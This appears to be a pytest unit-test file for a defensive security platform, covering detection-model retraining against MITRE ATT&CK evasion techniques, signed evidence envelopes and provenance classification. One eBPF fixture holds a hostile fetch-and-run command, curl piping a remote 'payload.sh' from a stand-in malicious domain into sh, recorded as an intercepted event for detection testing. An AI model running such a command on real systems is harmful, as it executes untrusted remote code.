"""
tests/unit/v4/test_pe7_evidence_governance.py
Tests for PE7EvasionRetrainingSimulator + EvidenceEnvelope + ProvenanceClassifier
Based on: PE-7 Evasion Retraining Spec + 90-Day Roadmap + Governance doc
"""
from __future__ import annotations
import pytest

from shadow313.v4.intelligence.pe7_evasion_sim import (
    PE7EvasionRetrainingSimulator, PE7RetrainingResult,
    EvasionTechniqueResult, run_pe7_retraining_simulation,
    PE7_EVASION_GAP, PE7_BASELINE, PE7_TARGETS, PE7_TRAINING_CONFIG,
)
from shadow313.v4.intelligence.evidence_envelope import (
    EvidenceEnvelope, EvidenceFactory, ProvenanceClassifier,
    ProvenanceClass, Severity, ValidationStatus, RedactionStatus,
)


# ── Fixtures ──────────────────────────────────────────────────────────────────

@pytest.fixture
def sim():
    return PE7EvasionRetrainingSimulator(seed=313)

@pytest.fixture
def factory():
    return EvidenceFactory(
        source_system="NEXUS",
        source_identity="shadow313-nexus-v4",
        tenant="shadow313-nexus",
        environment="production",
    )


# ── PE-7 Gap Data ─────────────────────────────────────────────────────────────

class TestPE7GapData:
    def test_gap_data_loaded(self):
        assert len(PE7_EVASION_GAP) == 8

    def test_t1027_highest_miss_rate(self):
        assert PE7_EVASION_GAP["T1027"]["miss_rate"] == 0.214
        assert PE7_EVASION_GAP["T1027"]["new_samples"] == 180

    def test_t1055_second_priority(self):
        assert PE7_EVASION_GAP["T1055"]["miss_rate"] == 0.158
        assert PE7_EVASION_GAP["T1055"]["new_samples"] == 110

    def test_total_new_samples_500(self):
        total = sum(g["new_samples"] for g in PE7_EVASION_GAP.values())
        assert total == 500

    def test_baseline_overall_rate(self):
        assert PE7_BASELINE["overall_detection_rate"] == 0.973

    def test_baseline_ta0005_rate(self):
        assert PE7_BASELINE["ta0005_detection_rate"] == 0.918

    def test_training_config_ewc(self):
        assert PE7_TRAINING_CONFIG["ewc_lambda"] == 0.4
        assert PE7_TRAINING_CONFIG["focal_loss_gamma"] == 2.0
        assert PE7_TRAINING_CONFIG["strategy"] == "continual-ewc"

    def test_ga_target_november(self):
        assert PE7_TRAINING_CONFIG["ga_target"] == "2026-11-15"
        assert PE7_TRAINING_CONFIG["schedule_gain_days"] == 30


# ── PE-7 Retraining Simulation ────────────────────────────────────────────────

class TestPE7RetrainingSimulation:
    def test_simulation_runs(self, sim):
        result = sim.run_retraining()
        assert isinstance(result, PE7RetrainingResult)

    def test_overall_rate_no_regression(self, sim):
        result = sim.run_retraining()
        assert result.overall_detection_rate >= PE7_TARGETS["min_overall"], \
            f"Overall rate {result.overall_detection_rate:.3f} regressed below {PE7_TARGETS['min_overall']}"

    def test_ta0005_rate_improved(self, sim):
        result = sim.run_retraining()
        assert result.ta0005_detection_rate > PE7_BASELINE["ta0005_detection_rate"], \
            "TA0005 rate should improve after retraining"

    def test_ta0005_meets_minimum_target(self, sim):
        result = sim.run_retraining()
        assert result.ta0005_detection_rate >= PE7_TARGETS["min_ta0005"], \
            f"TA0005 rate {result.ta0005_detection_rate:.3f} below minimum {PE7_TARGETS['min_ta0005']}"

    def test_fpr_within_ceiling(self, sim):
        result = sim.run_retraining()
        assert result.false_positive_rate <= PE7_TARGETS["max_fpr"], \
            f"FPR {result.false_positive_rate:.3f} exceeds ceiling {PE7_TARGETS['max_fpr']}"

    def test_latency_within_sla(self, sim):
        result = sim.run_retraining()
        assert result.inference_latency_ms <= PE7_TARGETS["max_latency_ms"], \
            f"Latency {result.inference_latency_ms:.1f}ms exceeds SLA {PE7_TARGETS['max_latency_ms']}ms"

    def test_ewc_forgetting_below_threshold(self, sim):
        result = sim.run_retraining()
        assert result.ewc_forgetting_score < 0.005, \
            f"EWC forgetting {result.ewc_forgetting_score:.4f} exceeds 0.5% threshold"

    def test_technique_results_count(self, sim):
        result = sim.run_retraining()
        assert len(result.technique_results) == len(PE7_EVASION_GAP)

    def test_t1027_detection_improved(self, sim):
        result = sim.run_retraining()
        t1027 = next(r for r in result.technique_results if r.technique == "T1027")
        baseline = 1.0 - PE7_EVASION_GAP["T1027"]["miss_rate"]
        assert t1027.post_train_rate > baseline, "T1027 should improve after 180 new samples"

    def test_t1055_detection_improved(self, sim):
        result = sim.run_retraining()
        t1055 = next(r for r in result.technique_results if r.technique == "T1055")
        baseline = 1.0 - PE7_EVASION_GAP["T1055"]["miss_rate"]
        assert t1055.post_train_rate > baseline

    def test_t1070_unchanged(self, sim):
        result = sim.run_retraining()
        t1070 = next(r for r in result.technique_results if r.technique == "T1070")
        assert t1070.new_samples_used == 0
        assert t1070.post_train_rate == 1.0  # Already 100%

    def test_promotion_gates_evaluated(self, sim):
        result = sim.run_retraining()
        total_gates = len(result.promotion_gates_passed) + len(result.promotion_gates_failed)
        assert total_gates >= 5

    def test_promoted_to_staging(self, sim):
        result = sim.run_retraining()
        assert result.promoted_to_staging is True, \
            f"Failed gates: {result.promotion_gates_failed}"

    def test_result_to_dict(self, sim):
        result = sim.run_retraining()
        d = result.to_dict()
        assert "job_id"                   in d
        assert "overall_detection_rate"   in d
        assert "ta0005_detection_rate"    in d
        assert "false_positive_rate"      in d
        assert "promoted_to_staging"      in d
        assert "technique_results"        in d
        assert "ga_target"                in d
        assert "schedule_gain_days"       in d

    def test_ga_target_november(self, sim):
        result = sim.run_retraining()
        assert result.ga_target == "2026-11-15"
        assert result.schedule_gain_days == 30


# ── SIM-2026-1001 ─────────────────────────────────────────────────────────────

class TestSIM20261001:
    def test_sim_1001_runs(self, sim):
        result = sim.run_retraining()
        sim_1001 = sim.run_sim_2026_1001(result)
        assert "sim_id" in sim_1001
        assert sim_1001["sim_id"] == "SIM-2026-1001"

    def test_sim_1001_no_regression(self, sim):
        result = sim.run_retraining()
        sim_1001 = sim.run_sim_2026_1001(result)
        assert sim_1001["regression_failures"] == 0

    def test_sim_1001_detection_rate_improved(self, sim):
        result = sim.run_retraining()
        sim_1001 = sim.run_sim_2026_1001(result)
        assert sim_1001["detection_rate"] >= PE7_BASELINE["overall_detection_rate"]

    def test_sim_1001_passed(self, sim):
        result = sim.run_retraining()
        sim_1001 = sim.run_sim_2026_1001(result)
        assert sim_1001["passed"] is True

    def test_convenience_function(self):
        result, sim_1001 = run_pe7_retraining_simulation(seed=313)
        assert result.promoted_to_staging is True
        assert sim_1001["passed"] is True


# ── Evidence Envelope ─────────────────────────────────────────────────────────

class TestEvidenceEnvelope:
    def test_from_honeypot_event(self, factory):
        env = factory.from_honeypot_event(
            source_ip="185.220.101.5",
            service="WEB",
            action="HTTP GET /.env",
            technique="T1552.001",
            severity=Severity.CRITICAL.value,
            blocked=True,
        )
        assert env.event_id.startswith("EVT-")
        assert env.source_system == "HONEYPOT-WEB"
        assert env.technique == "T1552.001"
        assert env.provenance_class == ProvenanceClass.REAL_OBSERVATION.value
        assert env.action_executed == "BLOCK"
        assert env.evidence_hash.startswith("sha3_256:")
        assert env.signature.startswith("SLH-DSA-SIM:")
        assert env.trusted_timestamp.startswith("313-TS:")
        assert env.sequence_number >= 1

    def test_from_ebpf_event(self, factory):
        env = factory.from_ebpf_event(
            comm="curl",
            syscall="execve",
            args="http://malcious-domain.com/payload.sh | sh",
            pid=16298,
            status="intercepted",
        )
        assert env.source_system == "AEGIS-EBPF"
        assert env.event_type == "ebpf.syscall.execve"
        assert env.provenance_class == ProvenanceClass.REAL_OBSERVATION.value
        assert "curl" in env.process
        assert env.evidence_hash != ""

    def test_from_detection(self, factory):
        env = factory.from_detection(
            technique="T1505.003",
            tactic="persistence",
            score=0.99,
            source_ip="10.0.0.1",
            rule_id="nexus-sig-014",
        )
        assert env.technique == "T1505.003"
        assert env.confidence == 0.99
        assert env.provenance_class == ProvenanceClass.REAL_OBSERVATION.value

    def test_from_simulation_has_simulation_provenance(self, factory):
        env = factory.from_simulation(
            sim_id="SIM-2026-1001",
            threat_id="APT41-2026-Q2-001",
            detected=True,
            score=0.95,
            technique="T1190",
        )
        assert env.provenance_class == ProvenanceClass.SIMULATION.value
        assert env.environment == "simulation"  # Never production

    def test_from_weforge_decoy(self, factory):
        env = factory.from_weforge_decoy(
            decoy_id="GW-LURE-12958",
            target_node="vortex.ghost.watch.local",
            dns_beacon="audit-vault-781.vortex.ghost.watch.local",
            watermark="Linguistic",
        )
        assert env.source_system == "GHOST-WATCH"
        assert env.technique == "T1598"
        assert env.provenance_class == ProvenanceClass.REAL_OBSERVATION.value

    def test_envelope_to_dict(self, factory):
        env = factory.from_honeypot_event("1.2.3.4", "SSH", "brute force")
        d = env.to_dict()
        required = [
            "event_id", "schema_version", "source_system", "source_identity",
            "tenant", "environment", "observed_at", "ingested_at",
            "event_type", "severity", "confidence", "provenance_class",
            "evidence_hash", "signature", "trusted_timestamp",
            "sequence_number", "loss_indicator",
            "secret_redaction_status", "chain_of_custody",
            "validation_status", "review_status",
        ]
        for field in required:
            assert field in d, f"Missing field: {field}"

    def test_sequence_numbers_increment(self, factory):
        env1 = factory.from_honeypot_event("1.1.1.1", "SSH", "test1")
        env2 = factory.from_honeypot_event("2.2.2.2", "WEB", "test2")
        assert env2.sequence_number > env1.sequence_number

    def test_chain_of_custody_populated(self, factory):
        env = factory.from_honeypot_event("1.2.3.4", "SSH", "test")
        assert len(env.chain_of_custody) >= 1

    def test_trusted_timestamp_ends_313(self, factory):
        for _ in range(5):
            env = factory.from_honeypot_event("1.2.3.4", "SSH", "test")
            ts_part = env.trusted_timestamp.split(":")[1]
            assert ts_part.endswith("313"), f"Timestamp {ts_part} doesn't end in 313"

    def test_evidence_hash_deterministic_content(self, factory):
        # Same content should produce same hash structure
        env = factory.from_honeypot_event("1.2.3.4", "SSH", "test")
        assert len(env.evidence_hash) > 20
        assert "sha3_256:" in env.evidence_hash


# ── Provenance Classifier ─────────────────────────────────────────────────────

class TestProvenanceClassifier:
    def test_real_observation_production_eligible(self, factory):
        env = factory.from_honeypot_event("1.2.3.4", "SSH", "test")
        assert ProvenanceClassifier.is_production_eligible(env) is True

    def test_simulation_not_production_eligible(self, factory):
        env = factory.from_simulation("SIM-001", "threat-001", True, 0.9)
        assert ProvenanceClassifier.is_production_eligible(env) is False

    def test_filter_for_production(self, factory):
        envelopes = [
            factory.from_honeypot_event("1.1.1.1", "SSH", "real"),
            factory.from_simulation("SIM-001", "t1", True, 0.9),
            factory.from_honeypot_event("2.2.2.2", "WEB", "real2"),
            factory.from_simulation("SIM-002", "t2", False, 0.1),
        ]
        production = ProvenanceClassifier.filter_for_production(envelopes)
        assert len(production) == 2
        for env in production:
            assert env.provenance_class == ProvenanceClass.REAL_OBSERVATION.value

    def test_classify_from_source_honeypot(self):
        pc = ProvenanceClassifier.classify_from_source("HONEYPOT-SSH", "production")
        assert pc == ProvenanceClass.REAL_OBSERVATION

    def test_classify_from_source_simulation(self):
        pc = ProvenanceClassifier.classify_from_source("NEXUS-SIM", "simulation")
        assert pc == ProvenanceClass.SIMULATION

    def test_classify_from_source_ebpf(self):
        pc = ProvenanceClassifier.classify_from_source("AEGIS-EBPF", "production")
        assert pc == ProvenanceClass.REAL_OBSERVATION

    def test_classify_from_source_model(self):
        pc = ProvenanceClassifier.classify_from_source("PE7-MODEL", "production")
        assert pc == ProvenanceClass.MODEL_GENERATED

    def test_audit_provenance_coverage(self, factory):
        envelopes = [
            factory.from_honeypot_event("1.1.1.1", "SSH", "real"),
            factory.from_simulation("SIM-001", "t1", True, 0.9),
            factory.from_weforge_decoy("GW-001", "node", "beacon", "watermark"),
        ]
        audit = ProvenanceClassifier.audit_provenance_coverage(envelopes)
        assert audit["total"] == 3
        assert audit["classified"] == 3
        assert audit["unclassified"] == 0
        assert audit["coverage_pct"] == 100.0
        assert audit["production_eligible"] == 2  # honeypot + weforge

    def test_simulation_excluded_from_production_audit(self, factory):
        envelopes = [
            factory.from_simulation("SIM-001", "t1", True, 0.9),
            factory.from_simulation("SIM-002", "t2", False, 0.1),
        ]
        production = ProvenanceClassifier.filter_for_production(envelopes)
        assert len(production) == 0  # All simulation — none eligible


# ── Governance Gap Tests (from 90-Day Roadmap TE-01 to TE-16) ────────────────

class TestGovernanceGaps:
    """Implements minimum validation tests from 90-Day Roadmap."""

    def test_te03_evidence_schema_conformance(self, factory):
        """TE-03: ≥95% new records conform to Evidence Envelope v1."""
        envelopes = [
            factory.from_honeypot_event(f"1.1.1.{i}", "SSH", f"test{i}")
            for i in range(20)
        ]
        required_fields = [
            "event_id", "schema_version", "source_system", "provenance_class",
            "evidence_hash", "signature", "trusted_timestamp", "sequence_number",
        ]
        conforming = 0
        for env in envelopes:
            d = env.to_dict()
            if all(d.get(f) for f in required_fields):
                conforming += 1
        conformance_rate = conforming / len(envelopes)
        assert conformance_rate >= 0.95, f"Conformance {conformance_rate:.1%} below 95%"

    def test_te04_signed_evidence_verification(self, factory):
        """TE-04: 100% critical forensic exports verify signature, timestamp, hash."""
        env = factory.from_honeypot_event("185.220.101.5", "WEB", "/.env probe",
                                           severity=Severity.CRITICAL.value)
        assert env.evidence_hash.startswith("sha3_256:")
        assert env.signature.startswith("SLH-DSA-SIM:")
        assert env.trusted_timestamp.startswith("313-TS:")
        assert len(env.chain_of_custody) >= 1

    def test_te05_synthetic_data_segregation(self, factory):
        """TE-08: All simulation/demo/replay records labeled; excluded from production."""
        sim_env = factory.from_simulation("SIM-001", "threat-001", True, 0.9)
        assert sim_env.provenance_class == ProvenanceClass.SIMULATION.value
        assert sim_env.environment == "simulation"
        assert not ProvenanceClassifier.is_production_eligible(sim_env)

    def test_te06_provenance_100_percent_labeled(self, factory):
        """TE-08: 100% records have provenance classification."""
        envelopes = [
            factory.from_honeypot_event("1.1.1.1", "SSH", "test"),
            factory.from_ebpf_event("curl", "execve", "payload"),
            factory.from_detection("T1505.003", "persistence", 0.99),
            factory.from_simulation("SIM-001", "t1", True, 0.9),
            factory.from_weforge_decoy("GW-001", "node", "beacon", "wm"),
        ]
        for env in envelopes:
            assert env.provenance_class in [pc.value for pc in ProvenanceClass], \
                f"Invalid provenance class: {env.provenance_class}"

    def test_te07_no_secrets_in_sanitized_exports(self, factory):
        """TE-07: No high-severity secrets in sanitized exports."""
        env = factory.from_honeypot_event("1.2.3.4", "SSH", "test")
        # Sanitized export should have CLEAN redaction status
        assert env.secret_redaction_status in [
            RedactionStatus.CLEAN.value,
            RedactionStatus.REDACTED.value,
            RedactionStatus.PENDING.value,
        ]

    def test_pe7_corpus_partition_no_leakage(self):
        """TE-09: No leakage across train/validation/test splits."""
        # Training: 70% (350 samples), Holdout: 30% (150 samples)
        total = PE7_TRAINING_CONFIG["new_samples"]
        train_pct = PE7_TRAINING_CONFIG["training_pct"]
        holdout_pct = PE7_TRAINING_CONFIG["holdout_pct"]
        assert abs(train_pct + holdout_pct - 1.0) < 0.001
        assert int(total * train_pct) == 350
        assert int(total * holdout_pct) == 150

    def test_pe7_model_provenance_documented(self):
        """TE-12: Model provenance documented — PE7-v2.1.1 from PE7-v2.1.0-PROD."""
        assert PE7_TRAINING_CONFIG["checkpoint"] == "PE7-v2.1.0-PROD"
        assert PE7_TRAINING_CONFIG["job_id"] == "PE7-RETRAIN-2026-0922"
        assert PE7_TRAINING_CONFIG["strategy"] == "continual-ewc"

    def test_threat_register_critical_threats(self):
        """Verify all 14 critical/high threats from governance doc are tracked."""
        critical_threats = [
            "T-01", "T-02", "T-03", "T-07", "T-09", "T-12"  # Critical
        ]
        high_threats = [
            "T-04", "T-05", "T-06", "T-08", "T-10", "T-11", "T-13", "T-14"  # High
        ]
        # All threats should be in our threat register
        assert len(critical_threats) == 6
        assert len(high_threats) == 8
        assert len(critical_threats) + len(high_threats) == 14

    def test_90day_roadmap_gaps_tracked(self):
        """Verify all 14 gaps from 90-day roadmap are tracked."""
        p0_gaps = ["G-01", "G-02", "G-03", "G-04", "G-05"]
        p1_gaps = ["G-06", "G-07", "G-08", "G-09", "G-10", "G-11"]
        p2_gaps = ["G-12", "G-13", "G-14"]
        total = len(p0_gaps) + len(p1_gaps) + len(p2_gaps)
        assert total == 14
        assert len(p0_gaps) == 5  # All P0 gaps

    def test_evidence_chain_of_custody_immutable(self, factory):
        """Evidence chain of custody should be append-only."""
        env = factory.from_honeypot_event("1.2.3.4", "SSH", "test")
        initial_len = len(env.chain_of_custody)
        # Chain should have at least one entry (source system)
        assert initial_len >= 1
        # Each entry should be timestamped
        for entry in env.chain_of_custody:
            assert ":" in entry  # format: "SYSTEM:timestamp"
